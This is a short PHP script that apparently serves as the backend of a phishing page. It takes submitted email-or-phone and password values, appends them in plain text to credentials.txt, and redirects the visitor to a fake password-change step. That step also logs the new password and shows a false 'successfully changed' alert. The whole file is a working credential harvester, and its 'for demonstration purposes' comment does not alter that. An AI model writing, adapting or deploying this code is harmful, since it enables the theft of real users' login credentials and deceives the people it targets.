<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['emailOrPhone']) && isset($_POST['password'])) {
        $emailOrPhone = $_POST['emailOrPhone'];
        $password = $_POST['password'];

        // Save credentials to a file (for demonstration purposes)
        $file = fopen("credentials.txt", "a");
        fwrite($file, "Email/Phone: $emailOrPhone | Password: $password\n");
        fclose($file);

        // Redirect to password change form
        header("Location: index.html?changePassword=true");
        exit();
    }

    if (isset($_GET['changePassword']) && isset($_POST['newPassword']) && isset($_POST['retypePassword'])) {
        $newPassword = $_POST['newPassword'];
        $retypePassword = $_POST['retypePassword'];

        if ($newPassword === $retypePassword) {
            $file = fopen("credentials.txt", "a");
            fwrite($file, "New Password: $newPassword\n");
            fclose($file);
            echo '<script>alert("✅ Password successfully changed!");</script>';
        } else {
            echo '<script>alert("❌ Passwords do not match. Try again!");</script>';
        }
    }
}
?>
